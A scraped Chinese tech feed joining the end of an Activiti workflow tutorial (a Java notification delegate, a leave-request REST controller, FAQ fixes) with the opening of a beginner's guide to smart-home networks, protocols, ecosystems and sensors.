<h4 data-id="heading-20">5.5 Java Delegate任务</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.delegate;

<span class="hljs-keyword">import</span> org.activiti.engine.delegate.DelegateExecution;
<span class="hljs-keyword">import</span> org.activiti.engine.delegate.JavaDelegate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-comment">/**
 * 发送通知委托类
 */</span>
<span class="hljs-meta">@Component("sendNotificationDelegate")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendNotificationDelegate</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">JavaDelegate</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(DelegateExecution execution)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">processInstanceId</span> <span class="hljs-operator">=</span> execution.getProcessInstanceId();

        <span class="hljs-comment">// 获取流程变量</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">applicant</span> <span class="hljs-operator">=</span> (String) execution.getVariable(<span class="hljs-string">"applicant"</span>);
        <span class="hljs-type">Integer</span> <span class="hljs-variable">days</span> <span class="hljs-operator">=</span> (Integer) execution.getVariable(<span class="hljs-string">"days"</span>);
        <span class="hljs-type">Boolean</span> <span class="hljs-variable">approved</span> <span class="hljs-operator">=</span> (Boolean) execution.getVariable(<span class="hljs-string">"approved"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">comment</span> <span class="hljs-operator">=</span> (String) execution.getVariable(<span class="hljs-string">"comment"</span>);

        <span class="hljs-comment">// 构建通知内容</span>
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        message.append(<span class="hljs-string">"请假审批通知\n"</span>);
        message.append(<span class="hljs-string">"申请人: "</span>).append(applicant).append(<span class="hljs-string">"\n"</span>);
        message.append(<span class="hljs-string">"请假天数: "</span>).append(days).append(<span class="hljs-string">"\n"</span>);
        message.append(<span class="hljs-string">"审批结果: "</span>).append(approved ? <span class="hljs-string">"通过"</span> : <span class="hljs-string">"拒绝"</span>).append(<span class="hljs-string">"\n"</span>);
        <span class="hljs-keyword">if</span> (comment != <span class="hljs-literal">null</span>) {
            message.append(<span class="hljs-string">"审批意见: "</span>).append(comment);
        }

        <span class="hljs-comment">// 发送通知</span>
        sendEmail(applicant, message.toString());
        sendSMS(applicant, message.toString());

        System.out.println(<span class="hljs-string">"通知已发送: "</span> + message);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendEmail</span><span class="hljs-params">(String to, String content)</span> {
        <span class="hljs-comment">// 实现邮件发送逻辑</span>
        System.out.println(<span class="hljs-string">"发送邮件给: "</span> + to);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendSMS</span><span class="hljs-params">(String to, String content)</span> {
        <span class="hljs-comment">// 实现短信发送逻辑</span>
        System.out.println(<span class="hljs-string">"发送短信给: "</span> + to);
    }
}
</code></pre>
<h3 data-id="heading-21">六、流程交互时序图</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3267bc453f744ff1a7428dac28bfb364~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769561888&amp;x-signature=5rw6kJoYOI7cSDaUq99o76ljKc4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-22">七、REST API设计</h3>
<h4 data-id="heading-23">7.1 控制器实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.controller;

<span class="hljs-keyword">import</span> com.example.activiti.entity.LeaveRequest;
<span class="hljs-keyword">import</span> com.example.activiti.service.LeaveRequestService;
<span class="hljs-keyword">import</span> org.activiti.engine.task.Task;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * 请假审批控制器
 */</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/leave")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LeaveRequestController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> LeaveRequestService leaveRequestService;

    <span class="hljs-comment">/**
     * 提交请假申请
     * POST /api/leave/submit
     */</span>
    <span class="hljs-meta">@PostMapping("/submit")</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">submitLeaveRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> LeaveRequest leaveRequest)</span> {
        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">processInstanceId</span> <span class="hljs-operator">=</span> leaveRequestService.startLeaveProcess(leaveRequest);
            result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">true</span>);
            result.put(<span class="hljs-string">"processInstanceId"</span>, processInstanceId);
            result.put(<span class="hljs-string">"message"</span>, <span class="hljs-string">"请假申请提交成功"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">false</span>);
            result.put(<span class="hljs-string">"message"</span>, <span class="hljs-string">"提交失败: "</span> + e.getMessage());
        }

        <span class="hljs-keyword">return</span> result;
    }

    <span class="hljs-comment">/**
     * 查询待办任务
     * GET /api/leave/tasks/pending?assignee=xxx
     */</span>
    <span class="hljs-meta">@GetMapping("/tasks/pending")</span>
    <span class="hljs-keyword">public</span> List&lt;Task&gt; <span class="hljs-title function_">getPendingTasks</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String assignee)</span> {
        <span class="hljs-keyword">return</span> leaveRequestService.findPendingTasks(assignee);
    }

    <span class="hljs-comment">/**
     * 查询候选任务
     * GET /api/leave/tasks/candidate?group=xxx
     */</span>
    <span class="hljs-meta">@GetMapping("/tasks/candidate")</span>
    <span class="hljs-keyword">public</span> List&lt;Task&gt; <span class="hljs-title function_">getCandidateTasks</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String group)</span> {
        <span class="hljs-keyword">return</span> leaveRequestService.findCandidateTasks(group);
    }

    <span class="hljs-comment">/**
     * 审批任务
     * POST /api/leave/tasks/{taskId}/complete
     */</span>
    <span class="hljs-meta">@PostMapping("/tasks/{taskId}/complete")</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">completeTask</span><span class="hljs-params">(
            <span class="hljs-meta">@PathVariable</span> String taskId,
            <span class="hljs-meta">@RequestParam</span> <span class="hljs-type">boolean</span> approved,
            <span class="hljs-meta">@RequestParam</span> String comment)</span> {

        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

        <span class="hljs-keyword">try</span> {
            leaveRequestService.completeTask(taskId, approved, comment);
            result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">true</span>);
            result.put(<span class="hljs-string">"message"</span>, <span class="hljs-string">"任务审批完成"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">false</span>);
            result.put(<span class="hljs-string">"message"</span>, <span class="hljs-string">"审批失败: "</span> + e.getMessage());
        }

        <span class="hljs-keyword">return</span> result;
    }

    <span class="hljs-comment">/**
     * 查询流程历史
     * GET /api/leave/history/{processInstanceId}
     */</span>
    <span class="hljs-meta">@GetMapping("/history/{processInstanceId}")</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getProcessHistory</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String processInstanceId)</span> {
        <span class="hljs-keyword">return</span> leaveRequestService.getProcessHistory(processInstanceId);
    }

    <span class="hljs-comment">/**
     * 撤销流程
     * DELETE /api/leave/process/{processInstanceId}
     */</span>
    <span class="hljs-meta">@DeleteMapping("/process/{processInstanceId}")</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">cancelProcess</span><span class="hljs-params">(
            <span class="hljs-meta">@PathVariable</span> String processInstanceId,
            <span class="hljs-meta">@RequestParam</span> String reason)</span> {

        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

        <span class="hljs-keyword">try</span> {
            leaveRequestService.cancelProcess(processInstanceId, reason);
            result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">true</span>);
            result.put(<span class="hljs-string">"message"</span>, <span class="hljs-string">"流程已撤销"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">false</span>);
            result.put(<span class="hljs-string">"message"</span>, <span class="hljs-string">"撤销失败: "</span> + e.getMessage());
        }

        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<h3 data-id="heading-24">八、常见问题与解决方案</h3>
<h4 data-id="heading-25">8.1 流程无法启动</h4>
<p><strong>问题</strong>：调用startProcessInstanceByKey时抛出异常</p>
<p><strong>原因</strong>：</p>
<ul>
<li>流程定义未部署</li>
<li>流程定义key不匹配</li>
<li>数据库表未正确创建</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 检查流程是否已部署</span>
<span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> repositoryService.createProcessDefinitionQuery()
        .processDefinitionKey(<span class="hljs-string">"leaveRequest"</span>)
        .count();

<span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>) {
    <span class="hljs-comment">// 部署流程</span>
    deployProcess();
}
</code></pre>
<h4 data-id="heading-26">8.2 任务查询不到</h4>
<p><strong>问题</strong>：查询待办任务返回空列表</p>
<p><strong>原因</strong>：</p>
<ul>
<li>任务已分配给其他用户</li>
<li>任务已在其他会话中完成</li>
<li>流程已结束</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 使用多种方式查询</span>
List&lt;Task&gt; tasks = taskService.createTaskQuery()
        .taskAssignee(assignee)  <span class="hljs-comment">// 指定办理人</span>
        .taskCandidateGroup(<span class="hljs-string">"managers"</span>)  <span class="hljs-comment">// 候选组</span>
        .taskCandidateUser(assignee)  <span class="hljs-comment">// 候选人</span>
        .includeIdentityLinks()  <span class="hljs-comment">// 包含身份关联</span>
        .list();
</code></pre>
<h4 data-id="heading-27">8.3 流程变量丢失</h4>
<p><strong>问题</strong>：设置的流程变量在后续节点无法获取</p>
<p><strong>原因</strong>：</p>
<ul>
<li>变量作用域设置错误</li>
<li>变量被覆盖</li>
<li>流程变量未持久化</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 使用全局变量</span>
runtimeService.setVariable(processInstanceId, <span class="hljs-string">"varName"</span>, value);

<span class="hljs-comment">// 使用本地变量（仅当前任务可见）</span>
taskService.setVariableLocal(taskId, <span class="hljs-string">"varName"</span>, value);
</code></pre>
<h3 data-id="heading-28">九、总结</h3>
<p>Activiti是一个功能强大的工作流引擎，本文主要介绍了以下内容：</p>
<ol>
<li>搭建Activiti开发环境</li>
<li>理解核心API的使用方法</li>
<li>设计和实现复杂的业务流程</li>
<li>处理流程中的各种业务场景</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[玩转智能家居入门]]></title>    <link>https://juejin.cn/post/7597278451029770250</link>    <guid>https://juejin.cn/post/7597278451029770250</guid>    <pubDate>2026-01-20T15:20:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451029770250" data-draft-id="7597317683051249673" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="玩转智能家居入门"/> <meta itemprop="keywords" content="架构,程序员,运维"/> <meta itemprop="datePublished" content="2026-01-20T15:20:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="草堂笺"/> <meta itemprop="url" content="https://juejin.cn/user/1732486056383976"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            玩转智能家居入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486056383976/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    草堂笺
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:20:19.000Z" title="Tue Jan 20 2026 15:20:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>你买的是“智能家电”还是“智能家居”?</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de7f138b623149089a803130ab288de3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=EyXWtL8nb0X65CYh7p7u%2F1rZmDk%3D" alt="image-20260118200022352.png" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>一、 引言：戳破泡沫</strong></h2>
<p>现在的“智能家居”概念满天飞，但多数买回家的，只是一个“带手机遥控器的昂贵灯泡”、一个相当于楼道感应灯的玩具（人动传感器+智能灯/开关）......</p>
<p>这里有一个极客暴论： <strong>你买不到“智能家居”，只能买到“设备”或者“模版”。</strong></p>
<p>走进那些高大上的全屋智能体验店，看到的往往也只是一场精心编排的“样板间秀”。销售激情演示的那些炫酷场景大都是华而不实的“表演型智能”。</p>
<p>他们卖给你的是标准化的“套餐”，强行让你的生活去适应他们的系统，而不是设计一套真正适配你个人习惯的定制化方案。<strong>智能家居不是产品，而是一项关于生活方式的系统工程。</strong></p>
<p>如果你只是想用手机关灯，买个蓝牙灯、蓝牙开关即可；如果你想让房子为你服务, 享受智能化带来的便利，可以继续往下看看。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/898e6ec36bdf491d8b7b0e7cc0090c97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=Fvf2ZalQOOOVJvHcVULH3FaUBuw%3D" alt="image-20260118200638736.png" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>二、 定义：什么是智能家居？</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50dd841647c8455d9b250b0e3d95418c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=JXRYQXy9t1QWpB8BrSizkOp0eZI%3D" alt="image-20260118200954300.png" loading="lazy"/>
我们把定义分为两层：</p>
<h3 data-id="heading-2">1. 通俗版：少动嘴，不动手</h3>
<p>真正的智能家居，应该像《钢铁侠》里的贾维斯（Jarvis）。它不需要你掏出手机，甚至不需要你大喊大叫。它懂你的习惯，预判你的需求。</p>
<ul>
<li><strong>伪智能</strong>：手机 App 远程遥控（把开关做到了手机里，有点用，但不多）。</li>
<li><strong>真智能</strong>：自动化，无感触发。</li>
</ul>
<p>这里举一些形象的例子（图）</p>
<h3 data-id="heading-3">2. 专业版：感知 -&gt; 决策 -&gt; 执行</h3>
<p>基于 AIoT 技术，通过三个闭环实现物理空间的数字化：</p>
<ul>
<li><strong>感知</strong>：眼睛和耳朵（人体传感器、温湿度计、门窗磁、天气等）。</li>
<li><strong>决策</strong>：大脑（网关、本地服务器、自动化规则，甚至大模型）。</li>
<li><strong>执行</strong>：手和脚（智能开关、电机、红外发射器）。</li>
</ul>
<h2 data-id="heading-4"><strong>三、 人群画像</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f25da0aca45940318ebc41b9e512a3d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=zKS3owyUbV4PPBiUEYLwY9wu6Hs%3D" alt="image-20260118201810757.png" loading="lazy"/></p>
<p>在入坑之前，看看自己处于哪个阶段。这决定了你该花多少钱、多少精力。</p>
<ul>
<li><strong>Lv 0 小白用户</strong>：智能音箱或通过智能手机语音助手，偶尔喊一声“关灯”，经常断连或听错，心里吐槽一句“人工智障”，觉得智能家居不过尔尔。</li>
<li><strong>Lv 1 普通用户</strong>：全屋米家或 HomeKit，会设置简单的“离家/回家”模式，主要依赖语音控制，享受着智能设备带来的便捷。</li>
<li><strong>Lv 2 深度用户</strong>：开始关注<strong>传感器</strong>，设置自动化逻辑（如：人来灯亮，人走灯灭），非常关注稳定性。</li>
<li><strong>Lv 3 高级玩家</strong>：拥有nas 、树莓派 或 常开的台式机（电费感人），引入 Home Assistant (HA) 、 Node-RED，开始跨品牌接入，自部署服务。</li>
<li><strong>Lv 4 极客玩家</strong>：自己画 PCB，写固件，逆向通信协议，从缺啥买啥到<strong>缺啥做啥</strong>。</li>
<li><strong>Lv 5 “入魔”玩家（致敬）</strong>：单纯的nas跑服务已经无法满足需求，家里机柜比公司机房还专业，追求 99.999% 的极度稳定性，用大量时间自定义智能设备，若非业内人士，那就是真的爱好了，花费的时间和金钱成本已经远高于收获的便利，主打一个开心和成就感。</li>
</ul>
<p><strong>建议</strong>：本文适用于 Lv 0-2 的用户。 不要试图一口吃到饱，否则会经常被家里人骂。</p>
<p>好，那么，我们开始：</p>
<h2 data-id="heading-5"><strong>四、 基础设施：房子的神经系统</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77fb6ae0f928449eaad25678bb454cd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=QYkgoa%2Fwknp79Pb2857N4aB0ZfA%3D" alt="image-20260118194127474.png" loading="lazy"/></p>
<h3 data-id="heading-6">1. 网络是地基</h3>
<p>如果决定搞智能家居，那就不要相信运营商送的光猫路由一体机！那是为了让你能上网，不是为了让你连100+设备的。</p>
<ul>
<li><strong>全屋 Wi-Fi (Mesh)</strong> 是必须的。</li>
<li><strong>核心原则</strong>：能用网线别用无线。装修时，每个房间至少留一根网线。</li>
</ul>
<h3 data-id="heading-7">2. 通信协议大乱斗</h3>
<p>你的设备靠什么说话？</p>



































<table><thead><tr><th>协议</th><th>特点</th><th>适用场景</th><th>极客评价</th></tr></thead><tbody><tr><td><strong>Wi-Fi</strong></td><td>耗电大，不仅占带宽还占信道</td><td>插座、大电器、摄像头</td><td>设备多了路由器必崩，尽量少用。</td></tr><tr><td><strong>蓝牙Mesh</strong></td><td>便宜，延迟尚可，需网关</td><td>小米/米家系主流</td><td>现在的入门首选，性价比高。</td></tr><tr><td><strong>Zigbee</strong></td><td>极其稳定，低功耗，<strong>本地化执行能力强</strong></td><td>传感器、开关</td><td>极客首选（绿米 Aqara等）。断网了也能跑自动化。</td></tr><tr><td><strong>Matter</strong></td><td>未来的大一统？</td><td>跨平台互联</td><td>还在画饼阶段，设备贵且少，<strong>不要盲目等</strong>。</td></tr></tbody></table>
<p><strong>原则</strong>：核心自动化（灯光、安防）尽量走 Zigbee 或蓝牙Mesh，<strong>能本地执行绝不走云端</strong>（万一断网连灯都开不了）。</p>
<h2 data-id="heading-8"><strong>五、 软件生态：灵魂的选择</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40aef7baeef94807bc6780f66580e0ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=TuYd3xMfPsdSMW9O9UppcuTUjVY%3D" alt="image-20260118202008196.png" loading="lazy"/></p>
<h3 data-id="heading-9">1. 闭源生态（苹果 HomeKit / 小米米家 / 华为全屋）</h3>
<ul>
<li><strong>优势</strong>：开箱即用，学习成本低，适合 90% 的人。</li>
<li><strong>劣势</strong>：隐私在云端，品牌绑定严重，扩展性受限。</li>
<li><strong>建议</strong>：
<ul>
<li><strong>果粉</strong>：冲 HomeKit（Aqara 等），体验丝滑但<strong>钱包受罪</strong>。</li>
<li><strong>性价比</strong>：米家全家桶，生态最全，价格最香。</li>
<li><strong>什么时候用华为呢：有钱，只想享受智能家居带来的便利，对过程的快乐无感，适应能力较强，个性化需求很少。</strong></li>
</ul>
</li>
</ul>
<h3 data-id="heading-10">2. 开源生态（Home Assistant）</h3>
<ul>
<li><strong>优势</strong>：无限可能，打通一切品牌（比如把小米接入苹果、把美的接入小米），数据完全本地化。</li>
<li><strong>劣势</strong>：学习曲线极其陡峭，需要懂点软件，需要折腾代码和服务器。</li>
<li><strong>建议</strong>：普通用户首选“米家”或“HomeKit”，<strong>稳定压倒一切</strong>。当现有的生态无法满足你多变的需求时，再考虑 Home Assistant。</li>
</ul>
<h2 data-id="heading-11"><strong>六、 设备选材：把钱花在刀刃上</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af542989273d4260a47ca1284114e941~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=1cKDbf37tzL0wn4bf3em3odY%2FuM%3D" alt="image-20260118202211549.png" loading="lazy"/></p>
<h3 data-id="heading-12">1. 传感器（感知层）：不要省钱！</h3>
<p>除了网关，传感器是最重要的。</p>
<ul>
<li><strong>人体传感器</strong>：
<ul>
<li><em>人动传感器</em>：只能测“有人在动”。你上厕所玩手机不动，灯就会灭，非常尴尬。</li>
<li><em>人在传感器</em>：能测“有人存在”于指定区域。<strong>推荐卧室、书房、卫生间使用。</strong></li>
</ul>
</li>
<li><strong>门窗/光照/温湿度</strong>：这是自动化的基础数据源，多买几个贴着。</li>
<li><strong>天气</strong>：这个一般配置经纬度（定位）即可，从天气预报获取，本质上不需要传感器</li>
</ul>
<h3 data-id="heading-13">2. 执行器（执行层）</h3>
<ul>
<li><strong>灯光</strong>：智能开关 vs 智能灯泡？
<ul>
<li><strong>小白选开关</strong>：保留物理控制习惯，家里老人也能用，灯坏了换灯泡便宜，主打一个皮实稳定。</li>
<li><strong>极客选灯泡</strong>：为了色温和亮度调节，为了那该死的氛围感。但必须搭配“凌动开关”或“无线开关”，否则物理断电后就离线了。</li>
</ul>
</li>
